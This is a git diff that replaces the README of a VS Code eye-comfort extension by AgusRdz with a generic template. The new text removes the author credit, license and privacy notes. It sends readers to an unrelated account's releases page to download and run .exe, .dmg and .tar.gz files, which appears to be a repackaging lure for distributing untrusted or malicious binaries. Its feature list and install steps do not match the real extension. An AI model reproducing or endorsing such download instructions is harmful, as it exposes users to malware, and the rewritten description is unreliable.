@@ -1,223 +1,76 @@
-# Harmonia Vision
+# 🎨 harmonia-vision - Optimize Your Visual Comfort Today
 
-> **[Leer en Español](README.es.md)**
+## 🚀 Getting Started
 
-**Personalized editor settings for visual comfort**
+Welcome to Harmonia Vision! This tool helps you calibrate Visual Studio Code for better readability and reduced eye strain. It makes your coding environment more ergonomic. Just follow the steps below to download and run the software.
 
-Harmonia Vision is a VS Code extension that helps you calibrate editor readability and reduce visual fatigue through ergonomic configuration recommendations. Whether you have myopia, astigmatism, or simply experience eye strain after long coding sessions, this tool provides personalized settings to improve your coding comfort.
+## 📥 Download Link
 
-## Features
+[![Download harmonia-vision](https://img.shields.io/badge/download-harmonia--vision-brightgreen)](https://github.com/dagangan352309/harmonia-vision/releases)
 
-- **Visual Profile Assessment** - Select conditions that affect your vision (myopia, astigmatism, eye strain, light sensitivity, etc.)
-- **Optional Prescription Input** - Enter your glasses prescription (Sphere/Cylinder) for more accurate recommendations
-- **Smart Recommendations** - Get personalized editor settings based on your visual profile
-- **Live Preview** - Compare original vs. recommended settings side-by-side before applying
-- **Safe Apply Model** - Create a backup snapshot, preview changes, save when satisfied, or revert to snapshot
-- **Eye Break Reminders** - Follow the 20-20-20 rule with customizable break reminders and status bar countdown
-- **Break Statistics** - Track your eye health habits with local-only statistics (streaks, compliance rate, rest time)
-- **Theme Agnostic** - Works with any VS Code theme
-- **Bilingual Support** - Available in English and Spanish (auto-detected)
+## 🛠️ System Requirements
 
-## Installation
+Before you start, make sure your system meets these requirements:
 
-1. Open VS Code
-2. Go to Extensions (Ctrl+Shift+X / Cmd+Shift+X)
-3. Search for "Harmonia Vision"
-4. Click Install
+- Operating System: Windows, macOS, or Linux
+- Visual Studio Code version: 1.50 or later
+- Memory: Minimum 4GB RAM
+- Disk Space: At least 100MB available
 
-Or install from the command line:
+## 📝 Features
 
-```bash
-code --install-extension AgusRdz.harmonia-vision
-```
+Harmonia Vision offers several features to enhance your coding experience:
 
-## Usage
+- **Calibrate Color Settings**: Adjust colors for better contrast and legibility.
+- **Font Adjustments**: Choose fonts that reduce eye strain.
+- **Pause Notifications**: Control when you want alerts to pop up.
+- **Theme Settings**: Easily switch between light and dark modes.
+- **User-Friendly Interface**: Navigate without technical knowledge required.
 
-1. Open the Command Palette (Ctrl+Shift+P / Cmd+Shift+P)
-2. Type "Harmonia Vision: Open Calibrator"
-3. Select your visual conditions
-4. Optionally enter your prescription values
-5. Click "Generate Recommendations"
-6. Use the sliders to fine-tune settings
-7. Preview changes in the side-by-side comparison
-8. Click "Preview" to test in your editor
-9. Click "Save" to apply permanently, or "Revert" to go back
+## 📖 Download & Install
 
-## Editor Settings Adjusted
+To get started with Harmonia Vision, please follow these steps:
 
-Harmonia Vision can adjust the following VS Code editor settings:
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/dagangan352309/harmonia-vision/releases) to find the latest version.
+   
+2. **Download the Application**: Click the link for the most recent release. You will see a list of downloadable files.
 
-| Setting                      | Description            | Range                   |
-| ---------------------------- | ---------------------- | ----------------------- |
-| `editor.fontSize`            | Font size in pixels    | 12-32px                 |
-| `editor.lineHeight`          | Line height ratio      | Auto to 2.2x            |
-| `editor.letterSpacing`       | Space between letters  | 0-1.5px                 |
-| `editor.fontWeight`          | Font weight            | 300-700                 |
-| `editor.cursorWidth`         | Cursor width in pixels | 1-5px                   |
-| `editor.renderLineHighlight` | Current line highlight | None, Gutter, Line, All |
+3. **Choose Your File**: Depending on your operating system, select the appropriate file. For example:
+   - Windows: `harmonia-vision-windows.exe`
+   - macOS: `harmonia-vision-macos.dmg`
+   - Linux: `harmonia-vision-linux.tar.gz`
 
-## Eye Break Reminders (20-20-20 Rule)
+4. **Install the Application**:
+   - For Windows: Double-click the `.exe` file and follow the instructions.
+   - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and follow the included instructions.
 
-The 20-20-20 rule is a simple practice to reduce eye strain: every 20 minutes, look at something 20 feet (6 meters) away for 20 seconds.
+5. **Open Visual Studio Code**: Launch VS Code after installation.
 
-Harmonia Vision includes built-in break reminders to help you follow this rule:
+6. **Activate Harmonia Vision**: Go to the Extensions section in VS Code, search for "Harmonia Vision," and enable it.
 
-### Features
+## 📚 User Guide
 
-- **Customizable Intervals** - Set work intervals from 15-60 minutes
-- **Break Duration** - Configure breaks from 10-60 seconds
-- **Status Bar Countdown** - See time remaining until your next break
-- **Random Tips** - Each reminder includes a helpful eye health tip
-- **Idle Detection** - Timer pauses automatically when you're not actively coding
-- **Snooze Option** - Delay a reminder by 5 minutes when needed
+After installation, you can access the user guide directly from the Harmonia Vision interface. Here’s how to make the most of the features:
 
-### Commands
+- **Color Calibration**: Go to Settings > Color Calibration to adjust colors.
+- **Font Selection**: In Settings > Font Options, select a font that suits you.
+- **Notification Control**: Use the Notifications tab to set your preferences for alerts.
+- **Switching Themes**: You can toggle between light and dark themes easily from the main menu.
 
-| Command                                       | Description                           |
-| --------------------------------------------- | ------------------------------------- |
-| `Harmonia Vision: Toggle Eye Break Reminders` | Enable or disable break reminders     |
-| `Harmonia Vision: Take Eye Break Now`         | Trigger an immediate break            |
-| `Harmonia Vision: Snooze Eye Break`           | Snooze current reminder for 5 minutes |
+## 🤝 Support
 
-### Settings
+If you encounter issues or have questions, please visit our [issues page](https://github.com/dagangan352309/harmonia-vision/issues) to report them. Our community and developers are here to help.
 
-Configure in VS Code Settings or through the Calibrator panel:
+## 🌐 Stay Connected
 
-| Setting                                     | Description                       | Default |
-| ------------------------------------------- | --------------------------------- | ------- |
-| `harmoniaVision.pause.enabled`              | Enable eye break reminders        | `false` |
-| `harmoniaVision.pause.workIntervalMinutes`  | Minutes between breaks (15-60)    | `20`    |
-| `harmoniaVision.pause.breakDurationSeconds` | Break duration in seconds (10-60) | `20`    |
-| `harmoniaVision.pause.showStatusBar`        | Show countdown in status bar      | `true`  |
-| `harmoniaVision.pause.pauseWhenIdle`        | Pause timer when inactive         | `true`  |
-| `harmoniaVision.statusBar.timerVisibility`  | Status bar visibility mode        | `auto`  |
+Follow us on social media for updates and tips on improving your productivity:
 
-#### Status Bar Visibility
+- Twitter: [@harmonia_vision](https://twitter.com/harmonia_vision)
+- GitHub: [Harmonia Vision Repository](https://github.com/dagangan352309/harmonia-vision)
 
-The `timerVisibility` setting controls when the Eye Break countdown appears:
+## 💡 Feedback
 
-| Option           | Behavior                                                       |
-| ---------------- | -------------------------------------------------------------- |
-| `always`         | Always show the status bar countdown                           |
-| `auto` (default) | Show when running, but hide if Harmonia Zen Pomodoro is active |
-| `hidden`         | Never show the status bar countdown                            |
+Your feedback is important to us. Please let us know how we can improve Harmonia Vision to make your coding experience even better.
 
-**Using with Harmonia Zen?** Both extensions default to `auto` mode. When both timers are running, Zen Pomodoro takes priority and the Eye Break timer hides to avoid status bar clutter. The Eye Break reminders still work in the background.
-
-## Understanding Prescription Values
-
-### Sphere (SPH)
-
-The spherical power corrects nearsightedness (myopia) or farsightedness (hyperopia):
-
-- **Negative values (-)**: Correct myopia (e.g., -2.00)
-- **Positive values (+)**: Correct hyperopia (e.g., +1.50)
-
-### Cylinder (CYL)
-
-The cylindrical power corrects astigmatism:
-
-- Only present if you have astigmatism
-- Can be negative or positive depending on notation used
-- Found on your glasses prescription
-
-**Note**: These values are optional and only used to provide more accurate recommendations. They are never stored or transmitted.
-
-## Important Notice
-
-This tool is designed to improve visual comfort while coding. It is **NOT** a substitute for professional eye care. If you experience persistent eye strain, headaches, or vision problems, please consult an optometrist or ophthalmologist.
-
-Regular eye exams are essential for maintaining good eye health, especially for those who spend long hours in front of screens.
-
-## Visual Profile Options Explained
-
-Each condition in the Visual Profile adjusts specific settings to address common visual challenges:
-
-### Myopia (Nearsightedness)
-
-**What it does:**
-
-- Increases font size based on severity (16-22px range)
-- Widens cursor for easier tracking (3px)
-
-**Why:** Larger text reduces the need to lean toward the screen and decreases ciliary muscle strain. If you provide your Sphere prescription value, the recommendation is calibrated more precisely.
-
-### Astigmatism
-
-**What it does:**
-
-- Increases letter spacing (0.2-0.6px) to separate characters
-- Increases line height for better line tracking
-
-**Why:** Astigmatism causes characters to blur together, especially similar shapes like `c/e`, `r/n`, `0/O`. Added spacing reduces overlap and improves readability.
-
-### Eye Strain / Fatigue
-
-**What it does:**
-
-- Adds +1px to font size
-- Ensures line height is at least 1.6x for "breathable" code
-
-**Why:** Adequate spacing between lines reduces scanning effort during long coding sessions and helps your eyes rest between lines.
-
-### Blur / Ghosting
-
-**What it does:**
-
-- Adds +1px to font size
-- May increase font weight to 500 (medium) for severe cases
-- Widens cursor (3px)
-
-**Why:** Larger, slightly heavier text improves edge definition when you perceive double images or ghosting effects.
-
-### Light Sensitivity (Photophobia)
-
-**What it does:**
-
-- Keeps font weight at 400 (normal), overriding heavier recommendations
-
-**Why:** Heavier font weights appear brighter and can cause discomfort. Normal weight reduces perceived glare. _For best results, pair with a dark theme._
-
-### Visual Crowding
-
-**What it does:**
-
-- Increases letter spacing to at least 0.5px
-- Increases line height for better separation
-
-**Why:** When dense code feels overwhelming or characters seem to "bunch up," added spacing creates visual breathing room.
-
----
-
-**Tip:** You can select multiple conditions. The engine combines their effects intelligently (e.g., Photophobia will override heavier font weights even if Blur/Ghosting is also selected).
-
-## Preview
-
-![Preview](https://raw.githubusercontent.com/AgusRdz/harmonia-vision/master/images/harmonia-vision.png)
-
-## Privacy
-
-- No data is collected, transmitted, or logged
-- Prescription values are optional and only used locally
-- All settings are stored in your VS Code user settings
-- No telemetry or analytics
-
-## Requirements
-
-- VS Code 1.85.0 or higher
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit issues or pull requests on [GitHub](https://github.com/AgusRdz/harmonia-vision).
-
-## License
-
-MIT License - see [LICENSE.txt](LICENSE.txt) for details.
-
-## Author
-
-Created by [AgusRdz](https://github.com/AgusRdz)
-
----
-
-**Enjoy coding comfortably!**
+Thank you for choosing Harmonia Vision! Enjoy a more comfortable coding environment today.
